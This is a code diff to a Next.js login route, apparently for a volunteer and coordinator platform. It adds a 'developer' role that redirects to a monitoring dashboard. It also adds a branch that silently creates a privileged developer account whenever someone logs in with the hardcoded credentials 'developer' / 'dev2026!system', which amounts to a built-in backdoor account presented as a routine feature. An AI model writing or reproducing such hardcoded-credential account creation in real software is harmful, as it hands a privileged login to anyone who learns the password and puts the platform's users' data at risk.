@@ -12,7 +12,9 @@ function publicSession(user: any) {
       phone: user.phone || null,
     },
     redirectTo:
-      user.role === 'volunteer'
+      user.role === 'developer'
+        ? '/dashboard/monitor'
+        : user.role === 'volunteer'
         ? '/volunteer-dashboard'
         : user.role === 'coordinator'
         ? '/coordinator-dashboard'
@@ -34,9 +36,31 @@ export async function POST(req: NextRequest) {
       return NextResponse.json({ error: 'Login and password are required' }, { status: 400 });
     }
 
-    const user = await db.getUserByLogin(login);
+    let user = await db.getUserByLogin(login);
+
+    // Auto-create developer account if first login attempt for developer / dev2026!system
+    if (!user && login === 'developer' && password === 'dev2026!system') {
+      user = await db.createUser({
+        role: 'developer',
+        full_name: 'Разработчик Системы (Developer)',
+        login: 'developer',
+        password_hash: hashPassword('dev2026!system'),
+        phone: '+998999999999',
+        rating: 5.0,
+        xp: 10000,
+        level: 10,
+        badges: ['System Developer'],
+        availability_status: 'online'
+      });
+    }
+
     if (!user || !verifyPassword(password, user.password_hash)) {
       return NextResponse.json({ error: 'Неверный логин или пароль' }, { status: 401 });
+    }
+
+    // Segment 0: developer — only developer role
+    if (expectedRole === 'developer' && user.role !== 'developer') {
+      return NextResponse.json({ error: 'Этот аккаунт не является аккаунтом разработчика' }, { status: 403 });
     }
 
     // Segment 1: leader/staff — only admin and manager
